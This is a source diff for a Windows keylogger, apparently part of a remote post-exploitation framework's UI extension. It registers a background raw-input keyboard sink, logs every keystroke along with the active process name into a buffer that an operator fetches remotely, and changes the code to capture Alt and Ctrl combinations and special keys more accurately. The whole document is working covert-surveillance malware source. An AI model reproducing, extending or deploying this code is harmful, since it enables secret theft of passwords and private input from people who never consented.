@@ -7,14 +7,14 @@ extern HMODULE hookLibrary;
 extern HINSTANCE hAppInstance;
 
 LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
-int ui_log_key(UINT vKey);
-int ui_resolve_raw_api();
+INT ui_log_key(UINT vKey, USHORT mCode, USHORT Flags);
+INT ui_resolve_raw_api();
 
-const char *c0_ascii[] = {
-	"^@", "^A", "^B", "^C", "^D", "^E", "^F", "^G", "^H", "^I",
-	"^J", "^K", "^L", "^M", "^N", "^O", "^P", "^Q", "^R", "^S",
-	"^T", "^U", "^V", "^W", "^X", "^Y", "^Z", "^[", "^\\", "^]",
-	"^^", "^-"
+const WCHAR *c0[] = {
+	L"^@", L"^A", L"^B", L"^C", L"^D", L"^E", L"^F", L"^G", L"^H", L"^I",
+	L"^J", L"^K", L"^L", L"^M", L"^N", L"^O", L"^P", L"^Q", L"^R", L"^S",
+	L"^T", L"^U", L"^V", L"^W", L"^X", L"^Y", L"^Z", L"^[", L"^\\", L"^]",
+	L"^^", L"^-"
 };
 
 /*
@@ -70,7 +70,7 @@ WCHAR *keyscan_buf = NULL;
 size_t idx = 0;
 WCHAR active_image[MAX_PATH] = L"Logging started";
 WCHAR prev_active_image[MAX_PATH] = { 0 };
-
+DWORD dwThreadId;
 /*
  * needed for process enumeration 
  */
@@ -78,11 +78,11 @@ WCHAR prev_active_image[MAX_PATH] = { 0 };
 typedef struct {
 	DWORD ppid;
 	DWORD cpid;
-} wndinfo;
+} WNDINFO;
 
 
 BOOL CALLBACK ecw_callback(HWND hWnd, LPARAM lp) {
-	wndinfo* info = (wndinfo*)lp;
+	WNDINFO* info = (WNDINFO*)lp;
 	DWORD pid = 0;
 	GetWindowThreadProcessId(hWnd, &pid);
 	if (pid != info->ppid) info->cpid = pid;
@@ -164,8 +164,8 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
     {
         // register raw input device
         case WM_CREATE:
-            rid.usUsagePage = 0x01;
-            rid.usUsage = 0x06;
+            rid.usUsagePage = 0x01;		// Generic Desktop Controls
+            rid.usUsage = 0x06;			// Keyboard
             rid.dwFlags = RIDEV_INPUTSINK;
             rid.hwndTarget = hwnd;
             
@@ -189,7 +189,7 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
                 if(buffer->header.dwType == RIM_TYPEKEYBOARD
                     && buffer->data.keyboard.Message == WM_KEYDOWN)
                 {
-                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
+                    if(ui_log_key(buffer->data.keyboard.VKey, buffer->data.keyboard.MakeCode, buffer->data.keyboard.Flags) == -1)
                         DestroyWindow(hwnd);
                 }
             }
@@ -309,17 +309,20 @@ DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
  * log keystrokes
  */
 
-int ui_log_key(UINT vKey)
+int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
 {
     BYTE lpKeyboard[256];
 	WCHAR kb[16] = { 0 };
 	HWND foreground_wnd;
 	HANDLE active_proc;
 	SYSTEMTIME st;
-	wndinfo info = { 0 };
+	WNDINFO info = { 0 };
 	DWORD mpsz = MAX_PATH;
 	WCHAR date_s[256] = { 0 };
 	WCHAR time_s[256] = { 0 };
+	WCHAR gknt_buf[256] = { 0 };
+	const bool isE0 = ((Flags & RI_KEY_E0) != 0);
+	const bool isE1 = ((Flags & RI_KEY_E1) != 0);
 
 	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
 	GetKeyboardState(lpKeyboard);
@@ -357,6 +360,10 @@ int ui_log_key(UINT vKey)
 		CloseHandle(active_proc);
 	}
 
+	// needed for some wonky cases
+	UINT key = (mCode << 16) | (isE0 << 24);
+	BOOL ctrl_is_down = (1 << 15) & (GetAsyncKeyState(VK_CONTROL));
+
 	switch (vKey)
 	{
 	case VK_BACK:
@@ -365,29 +372,33 @@ int ui_log_key(UINT vKey)
 	case VK_RETURN:
 		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<CR>\r\n");
 		break;
-	case VK_SHIFT:
-		break;
-	case VK_LCONTROL:
-		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Ctrl>");
-		break;
 	case VK_MENU:
-		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Alt>");
+		if (isE0)
+			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<RAlt>");
+		else
+			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<LAlt>");
 		break;
 	case VK_TAB:
 		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Tab>");
 		break;
+	case VK_NUMLOCK: // pause/break and numlock both send the same message
+		key = (MapVirtualKey(vKey, MAPVK_VK_TO_VSC) | 0x100);
+		if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
+		break;
 	default:
-		if (ToUnicodeEx(vKey, MapVirtualKey(vKey, 0), lpKeyboard, kb, 16, 0, NULL) == 1)
+		if (ctrl_is_down && (vKey != VK_CONTROL))
 		{
-			if ((UINT)vKey <= 0x1f)
-			{
-				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", c0_ascii[vKey]);
-				return 0;
-			}
-			else
-			{
-				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", kb);
-			}
+			if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<^%ls>", gknt_buf);
+		}
+		else if (ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
+		{
+			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", kb);
+		}
+		else if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
+		{
+			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
 		}
 	}
 	return 0;
